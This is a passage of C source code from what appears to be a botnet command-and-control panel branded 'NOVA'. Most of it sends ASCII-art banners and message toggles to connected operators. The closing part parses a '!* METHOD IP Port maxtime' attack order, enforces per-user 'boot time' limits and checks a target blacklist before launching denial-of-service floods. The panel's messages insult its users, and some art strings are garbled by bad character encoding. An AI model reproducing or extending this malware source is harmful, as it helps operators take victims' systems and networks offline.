 					managements[datafd].LoginListen = 0;
 				} else {
 					sprintf(usethis, ""Y"You Have Started Listening To Logins/Logouts\r\n");
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 					managements[datafd].LoginListen = 1; 				
 				}
 			} else {
				char sendbuf[50]; 
				sprintf(sendbuf, ""Y"You Do Not Have Admin Perms Bitch! - TOGGELLOGIN\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 	
 			}
 		}


///////////////////////////////////////////////////////////////////////////////////////////////END OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////

if(strcasestr(buf, "Netflix"))
{

char Netflix1  [2048];
char Netflix2  [2048];
char Netflix3  [2048];	
char Netflix4  [2048];
char Netflix5  [2048];
char Netflix6  [2048];
char Netflix7  [2048];
char Netflix8  [2048];
char Netflix9  [2048];
char Netflix10 [2048];
char Netflix11 [2048];
char Netflix12 [2048];
char Netflix13 [2048];
char Netflix14 [2048];
char Netflix15 [2048];
char Netflix16 [2048];
char Netflix17 [2048];
char Netflix18 [2048];
char Netflix19 [2048];
char Netflix20 [2048];
char Netflix21 [2048];
char Netflix22 [2048];
char Netflix23 [2048];
char Netflix24 [2048];
char Netflix25 [2048];
char Netflix26 [2048];

sprintf(Netflix1,   ""B"MMMMMMMMMMMMMMMMMMMMMM"R"ZZZZZZZZ"B"MMMMMM"R"OOOOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix2,   ""B"MMMMMMMMMMMMMMMMMMMMMM"R"8ZZZZZZZD"B"MMMMM"R"OOOOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix3,   ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OZZZZZZZZ"B"MMMMM"R"OOOOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix4,   ""B"MMMMMMMMMMMMMMMMMMMMMM"R"O8ZZZZZZZZ"B"MMMM"R"OOOOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix5,   ""B"MMMMMMMMMMMMMMMMMMMMMM"R"88ZZZZZZZZ"B"MMMM"R"OOOOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix6,   ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OO8ZZZZZZZZ"B"MMM"R"OOOOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix7,   ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OO8OZZZZZZZN"B"MM"R"OOOOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix8,   ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOO8ZZZZZZZZ"B"MM"R"OOOOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix9,   ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOO8OZZZZZZZN"B"M"R"OOOOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix10,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOO88ZZZZZZZZ"B"M"R"O8OOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix11,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOO88ZZZZZZZO88OOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix12,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOO88ZZZZZZZZ88OOOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix13,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOO8DZZZZZZZO88OOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix14,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOO88OZZZZZZZ88OOOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix15,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOO88ZZZZZZZZ88OOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix16,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOO88OZZZZZZZ88OOOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix17,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOO88"B"M"R"ZZZZZZZZ88OOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix18,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOOO8"B"M"R"NZZZZZZZ88OOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix19,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOOOO"B"MM"R"ZZZZZZZZ8OOO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix20,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOOOO"B"MM"R"NZZZZZZZO8OO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix21,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOOOO"B"MMM"R"ZZZZZZZZ8OO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix22,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOOOO"B"MMMM"R"ZZZZZZZZ8O"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix23,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOOOO"B"MMMM"R"ZZZZZZZZ8O"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix24,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOOOO"B"MMMMM"R"ZZZZZZZZO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix25,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"OOOOOOOO"B"MMMMM"R"DZZZZZZZO"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");
sprintf(Netflix26,  ""B"MMMMMMMMMMMMMMMMMMMMMM"R"8DD"B"MMMMMMMMMMMMMMM"R"ND8O"B"MMMMMMMMMMMMMMMMMMMMMMMM\r\n");

if(send(datafd, Netflix1,  strlen(Netflix1), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix2,  strlen(Netflix2), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix3,  strlen(Netflix3), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix4,  strlen(Netflix4), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix5,  strlen(Netflix5), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix6,  strlen(Netflix6), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix7,  strlen(Netflix7), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix8,  strlen(Netflix8), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix9,  strlen(Netflix9), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix10, strlen(Netflix10), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix11, strlen(Netflix11), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix12, strlen(Netflix12), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix13, strlen(Netflix13), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix14, strlen(Netflix14), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix15, strlen(Netflix15), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix16, strlen(Netflix16), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix17, strlen(Netflix17), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix18, strlen(Netflix18), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix19, strlen(Netflix19), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix20, strlen(Netflix20), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix21, strlen(Netflix21), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix22, strlen(Netflix22), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix23, strlen(Netflix23), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix24, strlen(Netflix24), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix25, strlen(Netflix25), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Netflix26, strlen(Netflix26), MSG_NOSIGNAL) == -1) goto end;
sleep(10);
send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);  			
if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;

}
if(strcasestr(buf, "weed"))
{
send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
char weed1  [2048];
char weed2  [2048];
char weed3  [2048];
char weed4  [2048];
char weed5  [2048];
char weed6  [2048];
char weed7  [2048];
char weed8  [2048];
char weed9  [2048];
char weed10 [2048];
char weed11 [2048];
char weed12 [2048];
char weed13 [2048];
char weed14 [2048];
char weed15 [2048];
char weed16 [2048];

sprintf(weed1,   ""B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed2,   ""B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed3,   ""B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed4,   ""B"â–‘â–‘"G"â–„"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘"G"â–„â–„"B"â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed5,   ""B"â–‘â–‘"G"â–ˆâ–€"G"â–„"B"â–‘â–‘â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘â–‘â–‘"G"â–„"G"â–€â–ˆ"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed6,   ""B"â–‘â–‘"G"â–€â–„"B"â–‘"G"â–€â–„"B"â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘"G"â–„â–€"B"â–‘"G"â–„"G"â–€"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed7,   ""B"â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘"G"â–€â–„"B"â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘"G"â–„â–€"B"â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed8,   ""B"â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘"G"â–ˆ"B"â–‘â–‘â–‘"G"â–ˆ"B"â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed9,   ""B"â–‘â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘"G"â–ˆ"B"â–‘"G"â–ˆ"B"â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘"G"â–ˆ"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed10,  ""G"â–ˆâ–„â–„â–„â–„"B"â–‘"G"â–€â–„"B"â–‘â–‘â–‘"G"â–ˆâ–ˆ"B"â–‘"G"â–ˆâ–ˆ"B"â–‘â–‘â–‘"G"â–„â–€"B"â–‘"G"â–„â–„â–„â–„â–„â–„"B"â–‘â–‘â–‘â–‘\r\n");
sprintf(weed11,  ""G"â–€â–„"B"â–‘â–‘â–‘"G"â–€â–€â–„â–ˆâ–„"B"â–‘"G"â–€â–ˆ"B"â–‘"G"â–ˆâ–€"B"â–‘"G"â–„â–ˆâ–„â–€â–€"B"â–‘â–‘â–‘"G"â–„â–€"B"â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed12,  ""B"â–‘â–‘"G"â–€â–€â–€â–„â–„â–„â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„â–„â–„â–„â–„â–€â–€â–€"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed13,  ""B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘"G"â–„â–€â–€"B"â–‘"G"â–ˆâ–ˆâ–ˆ"B"â–‘"G"â–€â–€â–„"B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘\r\n");
sprintf(weed14,  ""B"â–‘â–‘â–‘â–‘â–‘â–‘"G"â–„â–ˆâ–„â–„â–„â–€"B"â–‘"G"â–ˆ"B"â–‘"G"â–€â–„â–„â–„â–ˆ"B"â–‘â–‘"G"â–„"B"â–‘â–‘"G"â–„â–„"B"â–‘"G"â–„â–„â–„"B"â–‘\r\n");
sprintf(weed15,  ""B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘"G"â–€â–„"B"â–‘â–‘â–‘â–‘"G"â–€â–„â–€â–ˆ"B"â–‘"G"â–ˆ"B"â–‘â–‘"G"â–ˆâ–ˆ"B"â–‘â–‘"G"â–ˆ\r\n");
sprintf(weed16,  ""B"â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘"G"â–€"B"â–‘â–‘â–‘â–‘"G"â–ˆâ–„â–„â–ˆâ–„"B"â–‘"G"â–„â–€"B"â–‘"G"â–ˆ"B"â–‘â–‘"G"â–ˆ\r\n");

if(send(datafd, weed1, strlen(weed1), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed2, strlen(weed2), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed3, strlen(weed3), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed4, strlen(weed4), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed5, strlen(weed5), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed6, strlen(weed6), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed7, strlen(weed7), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed8, strlen(weed8), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed9, strlen(weed9), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed10, strlen(weed10), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed11, strlen(weed11), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed12, strlen(weed12), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed13, strlen(weed13), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed14, strlen(weed14), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed15, strlen(weed15), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, weed16, strlen(weed16), MSG_NOSIGNAL) == -1) goto end;
sleep(10);
send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);	
if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;
}
 if(strcasestr(buf, "America"))
{
send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
char flag1[2048];
char flag2[2048];
char flag3[2048];
char flag4[2048];
char flag5[2048];
char flag6[2048];
char flag7[2048];
char flag8[2048];
char flag9[2048];
char flag10[2048];
char flag11[2048];
char flag12[2048];
char flag13[2048];
char flag14[2048];
char flag15[2048];
char flag16[2048];
char flag17[2048];
char flag18[2048];
char flag19[2048];
char flag20[2048];
char flag21[2048];
char flag22[2048];
char flag23[2048];
sprintf(flag1,  "\e[38;5;17m88\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;196m###########################################\r\n");
sprintf(flag2,  "\e[38;5;17m8888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888888\e[38;5;196m###########################################\r\n");
sprintf(flag3,  "\e[38;5;17m88\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231m###########################################\r\n");
sprintf(flag4,  "\e[38;5;17m8888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888888\e[38;5;231m###########################################\r\n");
sprintf(flag5,  "\e[38;5;17m88\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;196m###########################################\r\n");
sprintf(flag6,  "\e[38;5;17m8888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888888\e[38;5;231m###########################################\r\n"); 
sprintf(flag7,  "\e[38;5;17m88\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;196m###########################################\r\n");
sprintf(flag8, "\e[38;5;17m8888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888888\e[38;5;231m###########################################\r\n");
sprintf(flag9, "\e[38;5;17m88\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;231mXX\e[38;5;17m888\e[38;5;196m###########################################\r\n");
sprintf(flag10, "\e[38;5;231m###########################################################################\r\n");
sprintf(flag11, "\e[38;5;196m###########################################################################\r\n");
sprintf(flag12, "\e[38;5;196m###########################################################################\r\n");
sprintf(flag13, "\e[38;5;231m###########################################################################\r\n");
sprintf(flag14, "\e[38;5;196m###########################################################################\r\n");
sprintf(flag15, "\e[38;5;196m###########################################################################\r\n");
sprintf(flag16, "\e[38;5;231m###########################################################################\r\n");
sprintf(flag17, "\e[38;5;196m###########################################################################\r\n");
sprintf(flag18, "\e[38;5;196m###########################################################################\r\n");
if(send(datafd, flag1, strlen(flag1), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag2, strlen(flag2), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag3, strlen(flag3), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag4, strlen(flag4), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag5, strlen(flag5), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag6, strlen(flag6), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag7, strlen(flag7), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag8, strlen(flag8), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag9, strlen(flag9), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag10, strlen(flag10), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag11, strlen(flag11), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag12, strlen(flag12), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag13, strlen(flag13), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag14, strlen(flag14), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag15, strlen(flag15), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag16, strlen(flag16), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag17, strlen(flag17), MSG_NOSIGNAL) == -1) goto end;
if(send(datafd, flag18, strlen(flag18), MSG_NOSIGNAL) == -1) goto end;
sleep(10);
send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;
}

if(strcasestr(buf, "toggle1"))
{
	if(managements[datafd].msgtoggle == 0)
	{
		sprintf(usethis, ""Y"Recieving Messages Has Been Toggled OFF\r\n");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		managements[datafd].msgtoggle = 1;
	} else {
		sprintf(usethis, ""Y"Recieving Messages Has Been Toggled ON\r\n");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		managements[datafd].msgtoggle = 0;		
	}
}

if(strcasestr(buf, "toggle2"))
{
	if(managements[datafd].broadcasttoggle == 0)
	{
		sprintf(usethis, ""Y"Recieving Brodcasts Has Been Toggled OFF\r\n");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		managements[datafd].broadcasttoggle = 1;
	} else {
		sprintf(usethis, ""Y"Recieving Brodcasts Has Been Toggled ON\r\n");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		managements[datafd].broadcasttoggle = 0;		
	}
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           //yeet
           if(strstr(buf, "!*"))// argv [0] = !* || argv[1] = METHOD || argv[2] = IP || argv[3] = Port || argv[4] = maxtime
            {
            	if(AttackStatus == 0)
            	{
            		if(managements[datafd].cooldownstatus == 0)
            		{
            			int gonnasend = 0;
                		char rdbuf[1024];
                		strcpy(rdbuf, buf);
                		int argc = 0;
                		unsigned char *argv[10 + 1] = { 0 };
                		char *token = strtok(rdbuf, " ");
                		while(token != 0 && argc < 10)
                		{
                		    argv[argc++] = malloc(strlen(token) + 1);
                		    strcpy(argv[argc - 1], token);
                		    token = strtok(0, " ");
                		} 
                	    
                			if(argc <= 4) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, ""Y"You Typed It Wrong Dumbass\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			}
						

                			else if(atoi(argv[4]) > managements[datafd].mymaxtime) 
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, ""Y"Boot Time Exceeded Retard\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			} else {
		
                				char *line3 = NULL;
								size_t n3 = 0;
								FILE *f3 = fopen("logs/Blacklist.txt", "r");
								    while (getline(&line3, &n3, f3) != -1){
								        if (strstr(line3, argv[2]) != NULL){
								        	gonnasend = 1;
								        	sprintf(usethis, ""Y"The IP %s Is Blacklisted\r\n", argv[2]);	
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
											sprintf(usethis, "\r\n"P"ðŸ’”"E"%s"W"@"E"NOVA"P"ðŸ’”"W":", managements[datafd].id);
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								    }
								}
